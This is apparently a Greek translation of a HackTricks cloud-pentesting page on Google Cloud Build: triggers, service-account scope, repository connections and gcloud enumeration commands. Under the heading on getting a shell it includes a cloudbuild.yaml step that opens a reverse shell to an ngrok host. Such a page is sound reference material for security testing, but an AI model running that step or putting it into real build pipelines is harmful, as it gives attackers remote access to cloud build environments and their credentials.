# GCP - Αναγνώριση Cloud Build

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Το Google Cloud Build είναι μια διαχειριζόμενη πλατφόρμα CI/CD που **αυτοματοποιεί τη διαδικασία κατασκευής λογισμικού** και την απελευθέρωσή του, ενσωματώνοντας **αποθετήρια κώδικα πηγής** και υποστηρίζοντας μια ευρεία γκάμα γλωσσών προγραμματισμού. Επιτρέπει στους προγραμματιστές να κατασκευάζουν, να δοκιμάζουν και να αναπτύσσουν κώδικα αυτόματα, παρέχοντας την ευελιξία να προσαρμόζουν τα βήματα κατασκευής και τις ροές εργασίας.

Κάθε Cloud Build Trigger σχετίζεται με ένα Cloud Repository ή συνδέεται απευθείας με ένα εξωτερικό αποθετήριο (Github, Bitbucket και Gitlab).

{% hint style="success" %}
Δεν μπόρεσα να δω κανέναν τρόπο να κλέψω το διακριτικό του Github/Bitbucket από εδώ ή από τα Cloud Repositories, επειδή όταν το αποθετήριο λήψης προσπελαύνεται μέσω ενός URL [https://source.cloud.google.com/](https://source.cloud.google.com/), και το Github δεν προσπελαύνεται από τον πελάτη.
{% endhint %}

### Γεγονότα

Το Cloud Build μπορεί να ενεργοποιηθεί αν:

* **Πατήσετε σε ένα κλαδί**: Καθορίστε το κλαδί
* **Πατήσετε ένα νέο ετικέτα**: Καθορίστε την ετικέτα
* **Αίτηση εξαγωγής (pull request)**: Καθορίστε το κλαδί που λαμβάνει την αίτηση εξαγωγής
* **Χειροκίνητη κλήση**
* **Μήνυμα Pub/Sub**: Καθορίστε το θέμα
* **Γεγονός Webhook**: Θα εκθέσει ένα URL HTTPS και η αίτηση πρέπει να εξουσιοδοτηθεί με ένα μυστικό

### Εκτέλεση

Υπάρχουν 3 επιλογές:

* Ένα yaml/json **που καθορίζει τις εντολές** προς εκτέλεση. Συνήθως: `/cloudbuild.yaml`
* Μόνο μία που μπορεί να καθοριστεί "inline" στην ιστοσελίδα κονσόλας και στο cli
* Η πιο συνηθισμένη επιλογή
* Σχετίζεται με την ανεξουσιοδότητη πρόσβαση
* Ένα **Dockerfile** για την κατασκευή
* Ένα **Buildpack** για την κατασκευή

### Δικαιώματα SA

Ο **Λογαριασμός Υπηρεσίας έχει το πεδίο `cloud-platform`**, έτσι μπορεί να **χρησιμοποιήσει όλα τα προνόμια**. Εάν **δεν καθοριστεί SA** (όπως όταν γίνεται υποβολή), θα χρησιμοποιηθεί ο **προεπιλεγμένος SA** `<proj-number>@cloudbuild.gserviceaccount.com`.

Από προεπιλογή δεν δίνονται καθόλου δικαιώματα, αλλά είναι αρκετά εύκολο να του δοθούν κάποια:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Έγκριση

Είναι δυνατόν να ρυθμιστεί ένα Cloud Build για να **απαιτεί έγκριση για την εκτέλεση της κατασκευής** (απενεργοποιημένο από προεπιλογή).

### Συνδέσεις & Αποθετήρια

Οι συνδέσεις μπορούν να δημιουργηθούν μέσω:

* **GitHub:** Θα εμφανίσει ένα παράθυρο OAuth που θα ζητά άδεια για να **λάβει ένα διακριτικό Github** που θα αποθηκευτεί μέσα στο **Secret Manager**.
* **GitHub Enterprise:** Θα ζητήσει να εγκαταστήσετε ένα **GithubApp**. Θα δημιουργηθεί και θα αποθηκευτεί σε αυτό το έργο ένα διακριτικό εξουσιοδότησης από τον κεντρικό σας διακομιστή GitHub ως μυστικό του **Secret Manager**.
* **GitLab / Enterprise:** Πρέπει να **παρέχετε το διακριτικό πρόσβασης του API και το διακριτικό πρόσβασης ανάγνωσης του API** που θα αποθηκευτούν στο **Secret Manager**.

Μόλις δημιου
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Δημιουργείται ένα κουβάς αποθήκευσης με το όνομα [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) για να αποθηκεύσει ένα αρχείο `.tgz` με τα αρχεία που θα χρησιμοποιηθούν.

### Λήψη κέλυφους
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Απαρίθμηση

Μπορείτε να βρείτε **ευαίσθητες πληροφορίες στις διαμορφώσεις και τα αρχεία καταγραφής των διαδικασιών κατασκευής**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Ανέλιξη Προνομίων

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Μη εξουσιοδοτημένη Πρόσβαση

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Μετά την Εκμετάλλευση

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
